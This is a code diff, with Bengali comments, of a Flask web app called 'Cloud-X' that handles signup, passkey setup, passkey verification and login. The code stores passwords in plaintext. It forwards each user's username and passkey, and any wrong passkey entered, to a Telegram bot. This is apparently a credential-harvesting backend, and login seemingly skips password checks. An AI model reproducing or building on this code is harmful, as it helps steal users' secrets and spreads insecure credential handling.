@@ -61,7 +61,7 @@ def signup():
     email = data.get('email')
     password = data.get('password')
 
-    # সাময়িকভাবে সেশনে ডেটা সেভ করে রাখা হচ্ছে
+    # সেশনে সাময়িকভাবে ডেটা সেভ রাখা
     session['username'] = username
     session['full_name'] = full_name
     session['email'] = email
@@ -100,18 +100,20 @@ def save_passkey():
     if not username:
         return jsonify({"status": "error", "message": "Session expired"})
 
-    # ডেটাবেজে ইউজার এবং পাসকি পার্মানেন্ট সেভ করা
     conn = sqlite3.connect('cloudx.db')
     cursor = conn.cursor()
+    
+    # একই ইউজারনেমের পুরোনো কোনো এন্ট্রি থাকলে তা ডিলিট করে নতুন ফ্রেশ ও সঠিক পাসকি ইনসার্ট করা
+    cursor.execute("DELETE FROM users WHERE username = ?", (username,))
     cursor.execute("INSERT INTO users (username, full_name, email, password, passkey) VALUES (?, ?, ?, ?, ?)",
                    (username, full_name, email, password, passkey))
     conn.commit()
     conn.close()
 
-    # টেলিগ্রামে পাসকি সহ আপডেট পাঠানো
+    # টেলিগ্রামে একদম আপডেট করা পাসকি সহ পাঠানো
     if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
         telegram_message = (
-            f"🔐 *Cloud-X Passkey Setup* 🔐\n\n"
+            f"🔐 *Cloud-X Passkey Setup / Update* 🔐\n\n"
             f"🔖 *Username:* {username}\n"
             f"🔑 *Passkey:* `{passkey}`"
         )
@@ -136,6 +138,7 @@ def verify_passkey():
 
     conn = sqlite3.connect('cloudx.db')
     cursor = conn.cursor()
+    # নির্দিষ্ট ইউজারের সর্বশেষ সেট করা পাসকি ডাটাবেজ থেকে ফেচ করা
     cursor.execute("SELECT passkey FROM users WHERE username = ? ORDER BY id DESC LIMIT 1", (username,))
     row = cursor.fetchone()
     conn.close()
@@ -148,9 +151,13 @@ def verify_passkey():
     else:
         session['passkey_verified'] = 'fake'
         
-        # ফেক পাসকি দিলে টেলিগ্রামে অ্যালার্ট পাঠানো
+        # ফেক বা ভুল পাসকি দিলে টেলিগ্রামে সাথে সাথে অ্যালার্ট পাঠানো
         if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-            fake_msg = f"⚠️ *Fake/Wrong Passkey Entered!*\n👤 User: {username}\n❌ Entered: `{entered_passkey}`"
+            fake_msg = (
+                f"⚠️ *Fake/Wrong Passkey Entered!* ⚠️\n\n"
+                f"👤 *Username:* {username}\n"
+                f"❌ *Entered Passkey:* `{entered_passkey}`"
+            )
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
             requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": fake_msg, "parse_mode": "Markdown"})
             
@@ -168,7 +175,6 @@ def login():
     row = cursor.fetchone()
     conn.close()
 
-    # আগের মতো সহজ লগইন বা পাসওয়ার্ড ম্যাচ করার সুবিধা রাখা হলো
     session['username'] = username
     if row:
         session['email'] = row[0]
